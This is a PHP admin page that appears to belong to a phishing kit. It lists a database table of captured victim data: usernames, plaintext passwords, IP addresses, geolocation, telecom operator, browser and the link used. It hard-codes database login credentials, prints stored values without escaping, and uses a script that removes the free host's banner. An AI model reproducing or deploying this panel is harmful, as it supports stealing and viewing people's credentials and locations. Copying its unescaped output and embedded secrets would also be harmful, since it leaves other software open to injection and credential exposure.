<?php
	session_start();
	if(!isset($_SESSION['log']))
	{
		header("refresh:0;url=/admin/");
		exit();
	}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<title>USER DETAILS</title>
<link rel="icon" href="/images/icon.gif">
</head>
	
<body class="bg-dark">
<div class="table-responsive" style="font-size: 0.6rem;">
<table class="table table-sm table-bordered table-dark">
  <thead>
    <tr class="bg-danger">
      <th scope="col">SERIAL_NO</th>
      <th scope="col">DAY</th>
      <th scope="col">DATE</th>
      <th scope="col">TIME</th>
      <th scope="col">USERNAME</th>
      <th scope="col">PASSWORD</th>
      <th scope="col">IP_ADDRESS</th>
      <th scope="col">PORT</th>
      <th scope="col">CITY</th>
      <th scope="col">REGION</th>
      <th scope="col">COUNTRY</th>
      <th scope="col">LATITUDE_LONGITUDE</th>
      <th scope="col">POSTAL_CODE</th>
      <th scope="col">TELECOM_OPERATOR</th>
      <th scope="col">SUBJECT</th>
      <th scope="col">TITLE_OF_PAGE</th>
      <th scope="col">BROWSER</th>
      <th scope="col">LINK</th>
    </tr>
  </thead>
  <tbody>
<?php
	$servername = "localhost";
	$username = "chandan2520";
	$password = "iamtiger#1";
	$dbname = "id9714525_my_database";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
	$sql = "SELECT * FROM `user_details` ORDER BY SERIAL_NO ASC";
	$result = mysqli_query($conn, $sql);
	mysqli_close($conn);
	while($row = mysqli_fetch_row($result))
	{
		echo '<tr>
				  <th scope="row">'.$row[0].'</th>
				  <td>'.$row[1].'</td>
				  <td>'.$row[2].'</td>
				  <td>'.$row[3].'</td>
				  <td>'.$row[4].'</td>
				  <td>'.$row[5].'</td>
				  <td>'.$row[6].'</td>
				  <td>'.$row[7].'</td>
				  <td>'.$row[8].'</td>
				  <td>'.$row[9].'</td>
				  <td>'.$row[10].'</td>
				  <td>'.$row[11].'</td>
				  <td>'.$row[12].'</td>
				  <td>'.$row[13].'</td>
				  <td>'.$row[14].'</td>
				  <td>'.$row[15].'</td>
				  <td>'.$row[16].'</td>
				  <td>'.$row[17].'</td>
				</tr>';
	}
?>
  
  </tbody>
</table>
</div>
<script>
	window.onload = () => 
	{
	   let bannerNode = document.querySelector('[alt="www.000webhost.com"]').parentNode.parentNode;
	   bannerNode.parentNode.removeChild(bannerNode);
	}
</script>
</body>
</html>